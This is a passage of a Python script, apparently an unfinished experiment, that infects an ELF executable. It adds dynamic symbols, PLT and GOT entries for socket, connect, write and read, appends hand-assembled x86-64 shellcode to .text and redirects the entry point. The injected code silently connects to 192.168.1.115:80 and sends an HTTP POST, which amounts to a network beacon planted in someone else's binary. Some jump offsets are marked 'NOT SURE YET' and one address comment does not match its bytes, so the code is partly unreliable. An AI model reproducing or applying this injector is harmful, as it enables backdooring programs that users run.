RELA_PLT_INJECT_SIZE = len(symbol_names) * RELA_PLT_ENTRY_SIZE
RELA_PLT_NUM_RELOCATIONS = RELA_PLT_SECTION.num_relocations()
#.dynsym
DYN_SYM_INJECT_OFFSET = DYN_SYM_SECTION['sh_offset'] + DYN_SYM_SECTION['sh_size']
DYN_SYM_ENTRY_SIZE = DYN_SYM_SECTION['sh_entsize']
DYN_SYM_INJECT_SIZE = len(symbol_names) * DYN_SYM_ENTRY_SIZE
for i in range(DYN_SYM_SECTION.num_symbols()):
    DYN_SYM_SYMBOL_NAMES.append(DYN_SYM_SECTION.get_symbol(i).name)
#.dynstr
section = ELF.get_section_by_name(".dynstr")
DYN_STR_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
DYN_STR_INJECT_SIZE = len(str_tab_entries)

#.text
section = ELF.get_section_by_name(".text")
TEXT_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
TEXT_INJECT_SIZE = 0x277 # size of inject array


RELA_PLT_OFFSET = ELF.get_section_by_name(".rela.plt")['sh_offset']
DYN_SYM_OFFSET = ELF.get_section_by_name(".dynsym")['sh_offset']
DYN_STR_OFFSET = ELF.get_section_by_name(".dynstr")['sh_offset']
GNU_VERSION_OFFSET = ELF.get_section_by_name(".gnu.version")['sh_offset']
GNU_VERSION_R_OFFSET = ELF.get_section_by_name(".gnu.version_r")['sh_offset']

TEXT_OFFSET = ELF.get_section_by_name(".text")['sh_offset']

SECTIONS_OFFSETS = [SYM_TAB_OFFSET,GOT_OFFSET,TEXT_OFFSET,PLT_SEC_OFFSET,PLT_OFFSET,RELA_PLT_OFFSET,GNU_VERSION_R_OFFSET,GNU_VERSION_OFFSET,DYN_STR_OFFSET,DYN_SYM_OFFSET]
ELF_SECTIONS_CHANGES = ['.symtab','.got','.text','.plt.sec','.plt','.rela.plt','.gnu.version_r','.gnu.version','.dynstr','.dynsym']
ELF_SECTIONS_INJECT_SIZES = [SYM_TAB_INJECT_SIZE,GOT_INJECT_SIZE,TEXT_INJECT_SIZE,PLT_SEC_INJECT_SIZE,PLT_INJECT_SIZE,RELA_PLT_INJECT_SIZE,GNU_VERSION_R_INJECT_SIZE,GNU_VERSION_INJECT_SIZE,DYN_STR_INJECT_SIZE,DYN_SYM_INJECT_SIZE]
INJECT_OFFSETS = [SYM_TAB_INJECT_OFFSET,GOT_INJECT_OFFSET,TEXT_INJECT_OFFSET,PLT_SEC_INJECT_OFFSET,PLT_INJECT_OFFSET,RELA_PLT_INJECT_OFFSET,GNU_VERSION_R_INJECT_OFFSET,GNU_VERSION_INJECT_OFFSET,DYN_STR_INJECT_OFFSET,DYN_SYM_INJECT_OFFSET]
ELF_SECTIONS_ALIGNMENT_SIZES = align_offsets() 
SECTION_INDICES = get_indices_of_sections()

SYM_TAB_ALIGNMENT_SIZE = get_alignment_size('.symtab')
GOT_ALIGNMENT_SIZE = get_alignment_size('.got')
PLT_SEC_ALIGNMENT_SIZE = get_alignment_size('.plt.sec')
PLT_ALIGNMENT_SIZE = get_alignment_size('.plt')
RELA_PLT_ALIGNMENT_SIZE = get_alignment_size('.rela.plt')
GNU_VERSION_R_ALIGNMENT_SIZE = get_alignment_size('.gnu.version_r')
GNU_VERSION_ALIGNMENT_SIZE = get_alignment_size('.gnu.version')
DYN_STR_ALIGNMENT_SIZE = get_alignment_size('.dynstr')
DYN_SYM_ALIGNMENT_SIZE = get_alignment_size('.dynsym')
TEXT_ALIGNMENT_SIZE = get_alignment_size('.text')

print("SECTIONS",ELF_SECTIONS_CHANGES)
print("SIZES",ELF_SECTIONS_INJECT_SIZES)
print("ALIGNMENT SIZES",ELF_SECTIONS_ALIGNMENT_SIZES)
print("SECTION OFFSETS",SECTIONS_OFFSETS)
print("INJECT OFFSETS",INJECT_OFFSETS)

socketPLT = 0x11223344
memsetPLT = 0x11223344
connectPLT =0x11223344
writePLT =  0x11223344
strlenPLT = 0x11223344
closePLT =  0x11223344
readPLT =   0x11223344
stack_chk_failPLT = 0x11223344

call_inject_indices = [0xa2, 0xce, 0x106, 0x11d, 0x15e, 0x1b0, 0x1f5, 0x240, 0x25c]

inject = [
    0xf3, 0x0f, 0x1e, 0xfa,                                     # enbr64
    0x50,                                                       # push %rax
    0x52,                                                       # push %rdx
    0x56,                                                       # push %rsi
    0x57,                                                       # push %rdi
    0x51,                                                       # push %rcx
    0x55,                                                       # push %rbp
    0x48, 0x89, 0xe5,                                           # mov %rsp, %rbp
    0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00,                   # sub $0x1000, %rsp
    0x48, 0x83, 0x0c, 0x24, 0x00,                               # orq $0x0, (%rsp)
    0x48, 0x83, 0xec, 0x70,                                     # sub $0x70, %rsp
    0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00,       # %fs:0x28, %rax
    0x48, 0x89, 0x45, 0xf8,                                     # mov %rax,-0x8(%rbp)
    0x31, 0xc0,                                                 # xor %eax, %eax
    0x48, 0xb8, 0x50, 0x4f, 0x53, 0x54, 0x20, 0x2f, 0x63, 0x6f, # movabs $0x6f632f2054534f50, %rax
    0x48, 0xba, 0x64, 0x65, 0x2d, 0x69, 0x6e, 0x6a, 0x65, 0x63, # movabs $0x63656a6e692d6564, %rdx
    0x48, 0x89, 0x85, 0xc0, 0xef, 0xff, 0xff,                   # mov %rax, -0x1040(%rbp)
    0x48, 0x89, 0x95, 0xc8, 0xef, 0xff, 0xff,                   # mov %rdx, -0x1038(%rbp)
    0x48, 0xb8, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x74, 0x69, 0x6d, # movabs $0x6d69742f6e6f6974,%rax
    0x48, 0xba, 0x65, 0x73, 0x74, 0x61, 0x6d, 0x70, 0x73, 0x20, # movabs $0x2073706d61747365,%rdx
    0x48, 0x89, 0x85, 0xd0, 0xef, 0xff, 0xff,                   # mov %rax, -0x1030(%rbp)
    0x48, 0x89, 0x95, 0xd8, 0xef, 0xff, 0xff,                   # mov %rdx, -0x1028(%rbp)
    0x48, 0xb8, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x30, # movabs $0x302e312f50545448,%rax
    0x48, 0x89, 0x85, 0xe0, 0xef, 0xff, 0xff,                   # mov %rax, -0x1020(%rbp)
    0xc7, 0x85, 0xe8, 0xef, 0xff, 0xff, 0x0d, 0x0a, 0x0d, 0x0a, # movl $0xa0d0a0d, -0x1018(%rbp)
    0xc6, 0x85, 0xec, 0xef, 0xff, 0xff, 0x00,                   # movb $0x0, -0x1014(%rbp)
    0xba, 0x00, 0x00, 0x00, 0x00,                               # mov $0x0, %edx
    0xbe, 0x01, 0x00, 0x00, 0x00,                               # mov $0x1, %esi
    0xbf, 0x02, 0x00, 0x00, 0x00,                               # mov $0x2, %edi
    0xe8,      socketPLT        ,                               # callq socket@PLT
    0x89, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov %eax, -0x105c(%rbp)
    0x83, 0xbd, 0xa4, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x105c(%rbp)
    0x0f, 0x88, 0x8d, 0x01, 0x00, 0x00,                         # js NOT SUre YET
    0x48, 0x8d, 0x85, 0xb0, 0xef, 0xff, 0xff,                   # lea -0x1050(%rbp),%rax
    0xba, 0x10, 0x00, 0x00, 0x00,                               # mov $0x10, %edx
    0xbe, 0x00, 0x00, 0x00, 0x00,                               # mov $0x0, %esi
    0x48, 0x89, 0xc7,                                           # mov %rax, %rdi
    0xe8,       memsetPLT       ,                               # callq memset@PLT
    0x66, 0xc7, 0x85, 0xb0, 0xef, 0xff, 0xff, 0x02, 0x00,       # movw $0x2, -0x1050(%rbp)
    0x66, 0xc7, 0x85, 0xb2, 0xef, 0xff, 0xff, 0x00, 0x50,       # movw $0x5000, -104e(%rbp)
    0xc7, 0x85, 0xb4, 0xef, 0xff, 0xff, 0xc0, 0xa8, 0x01, 0x73, # movl $0x7e01a8c0, -0x104c(%rbp)
    0x48, 0x8d, 0x8d, 0xb0, 0xef, 0xff, 0xff,                   # lea -0x1050(%rbp),%rcx
    0x8b, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov -0x105c(%rbp),%eax
    0xba, 0x10, 0x00, 0x00, 0x00,                               # mov $0x10, %edx
    0x48, 0x89, 0xce,                                           # mov %rcx, %rsi
    0x89, 0xc7,                                                 # mov %eax, %edi
    0xe8,      connectPLT       ,                               # callq connect@PLT
    0x85, 0xc0,                                                 # test %eax, %eax
    0x0f, 0x88, 0x1b, 0x01, 0x00, 0x00,                         # js NOT SURE YET
    0x48, 0x8d, 0x85, 0xc0, 0xef, 0xff, 0xff,                   # lea -0x1040(%rbp),%rax
    0x48, 0x89, 0xc7,                                           # mov %rax, %rdi
    0xe8,      strlenPLT        ,                               # callq strlen@PLT
    0x89, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # mov %eax, -0x1058(%rbp)
    0xc7, 0x85, 0x9c, 0xef, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, # movl $0x0, -0x1064(%rbp)
    0x8b, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # mov -0x1058(%rbp), %eax
    0x2b, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # sub -0x1064(%rbp), %eax
    0x48, 0x63, 0xd0,                                           # movslq %eax, %rdx
    0x8b, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # mov -0x1064(%rbp), %eax
    0x48, 0x98,                                                 # cltq
    0x48, 0x8d, 0x8d, 0xc0, 0xef, 0xff, 0xff,                   # lea -0x1040(%rbp), %rcx
    0x48, 0x01, 0xc1,                                           # add %rax, %rcx
    0x8b, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov -0x105c(%rbp), %eax
    0x48, 0x89, 0xce,                                           # mov %rcx, %rsi
    0x89, 0xc7,                                                 # mov %eax, %edi
    0xe8,      writePLT         ,                               # callq write@PLT
    0x89, 0x85, 0xac, 0xef, 0xff, 0xff,                         # mov %eax, -0x1054(%rbp)
    0x83, 0xbd, 0xac, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x1054(%rbp)
    0x0f, 0x88, 0xbb, 0x00, 0x00, 0x00,                         # js NOT SURE YET
    0x83, 0xbd, 0xac, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x1054(%rbp)
    0x74, 0x1c,                                                 # je NOT SURE YET
    0x8b, 0x85, 0xac, 0xef, 0xff, 0xff,                         # mov -0x1054(%rbp),%eax
    0x01, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # add %eax, -0x1064(%rbp)
    0x8b, 0x85, 0x9c, 0xef, 0xff, 0xff,                         # mov -0x1064(%rbp),%eax
    0x3b, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # cmp -0x1058(%rbp),%eax
    0x7c, 0x99,                                                 # jl NOT SURE YET
    0xeb, 0x01,                                                 # jmp NOT SURE YET
    0x90,                                                       # nop
    0x48, 0x8d, 0x85, 0xf0, 0xef, 0xff, 0xff,                   # lea -0x1010(%rbp), %rax
    0xba, 0x00, 0x10, 0x00, 0x00,                               # mov $0x1000, %edx
    0xbe, 0x00, 0x00, 0x00, 0x00,                               # mov $0x0, %esi
    0x48, 0x89, 0xc7,                                           # mov %rax, %rdi
    0xe8,       memsetPLT       ,                               # callq memset@PLT
    0xc7, 0x85, 0xa8, 0xef, 0xff, 0xff, 0xff, 0x0f, 0x00, 0x00, # movl $0xfff, -0x1058(%rbp)
    0xc7, 0x85, 0xa0, 0xef, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, # movl $0x0, -0x1060(%rbp)
    0x8b, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # movl -0x1058(%rbp), %eax
    0x2b, 0x85, 0xa0, 0xef, 0xff, 0xff,                         # sub -0x1060(%rbp), %eax
    0x48, 0x63, 0xd0,                                           # movslq %eax, %rdx
    0x8b, 0x85, 0xa0, 0xef, 0xff, 0xff,                         # mov -0x1060(%rbp), %eax
    0x48, 0x98,                                                 # cltq
    0x48, 0x8d, 0x8d, 0xf0, 0xef, 0xff, 0xff,                   # lea -0x1010(%rbp), %rcx
    0x48, 0x01, 0xc1,                                           # add %rax, %rcx
    0x8b, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov -0x105c(%rbp),%eax
    0x48, 0x89, 0xce,                                           # mov %rcx, %rsi
    0x89, 0xc7,                                                 # mov %eax, %edi
    0xe8,          readPLT      ,                               # callq read@PLT
    0x89, 0x85, 0xac, 0xef, 0xff, 0xff,                         # mov %eax, -0x1054(%rbp)
    0x83, 0xbd, 0xac, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x1054(%rbp)
    0x78, 0x2b,                                                 # js NOT SURE YET
    0x83, 0xbd, 0xac, 0xef, 0xff, 0xff, 0x00,                   # cmpl $0x0, -0x1054(%rbp)
    0x74, 0x25,                                                 # je NOT SURE YET
    0x8b, 0x85, 0xac, 0xef, 0xff, 0xff,                         # mov -0x1054(%rbp), %eax
    0x01, 0x85, 0xa0, 0xef, 0xff, 0xff,                         # add %eax, -0x1060(%rbp)
    0x8b, 0x85, 0xa0, 0xef, 0xff, 0xff,                         # mov -0x1060(%rbp), %eax
    0x3b, 0x85, 0xa8, 0xef, 0xff, 0xff,                         # cmp -0x1058(%rbp), %eax
    0x7c, 0x9d,                                                 # jl idk
    0xeb, 0x0a,                                                 # jmp idk
    0x90,                                                       # nop
    0xeb, 0x07,                                                 # jmp idk
    0x90,                                                       # nop
    0xeb, 0x04,                                                 # jmp idk
    0x90,                                                       # nop
    0xeb, 0x01,                                                 # jmp idk
    0x90,                                                       # nop
    0x8b, 0x85, 0xa4, 0xef, 0xff, 0xff,                         # mov -0x105c(%rbp),%eax
    0x89, 0xc7,                                                 # mov %eax, %edi
    0xe8,       closePLT        ,                               # callq close@PLT
    0xeb, 0x01,                                                 # jmp idk
    0x90,                                                       # nop
    0xb8, 0x00, 0x00, 0x00, 0x00,                               # mov $0x0, %eax
    0x48, 0x8b, 0x75, 0xf8,                                     # mov -0x8(%rbp),%rsi
    0x64, 0x48, 0x33, 0x34, 0x25, 0x28, 0x00, 0x00, 0x00,       # xor %fs:0x28,%rsi
    0x74, 0x05,                                                 # je idk
    0xe8,   stack_chk_failPLT   ,                               # callq stack_chk_fail@PLT
    0xc9,                                                       # leaveq
    0x59,                                                       # pop %rcx
    0x5f,                                                       # pop %rdi
    0x5e,                                                       # pop %rsi
    0x5a,                                                       # pop %rdx
    0x58,                                                       # pop %rax
    0xeb, 0xf8,                                                 # jmp (probably going to change)
    0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, # nopw %cs:0x0(%rax,%rax,1)
    0x0f, 0x1f, 0x44, 0x00, 0x00,                               # nopl 0x0(%rax,%rax,1)
]   


# Modifications

edit_entry_point()
edit_symbol_table()
edit_dynamic_section()
edit_rela_dyn_section()
edit_rela_plt_section()
edit_gnu_version_r_section()

edit_text_section_calls()

edit_program_header()
edit_elf_sections()
edit_sections_changes_sizes()

modify_file(40,(ELF['e_shoff']+sum(ELF_SECTIONS_ALIGNMENT_SIZES)).to_bytes(8,'little'))

print("Num symbols to add ",len(symbol_names))

# Injections

add_functions_to_sym_tab()
add_functions_to_got()
inject_code()
add_functions_to_plt_sec()
add_functions_to_plt()
add_functions_to_rela_plt()
add_versions_to_gnu_version_r()
add_versions_to_gnu_version()
add_strings_to_dyn_str_tab()
add_functions_to_dyn_sym()

# rax rcx rdi rdi rsi r9 r12 r13 

print(hex(len(inject)+27))